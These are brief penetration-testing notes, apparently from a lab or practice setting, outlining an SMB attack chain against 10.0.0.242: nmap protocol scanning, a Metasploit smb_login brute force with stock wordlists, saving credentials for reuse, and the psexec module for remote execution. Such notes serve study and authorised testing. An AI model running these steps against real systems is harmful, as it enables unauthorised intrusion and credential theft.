

- nmap -p445 --script smb-protocols 10.0.0.242
- use auxiliary/scanner/smb/smb_login 
	- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
	- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	- save all creds for other services 
- use exploit/windows/smb/psexec

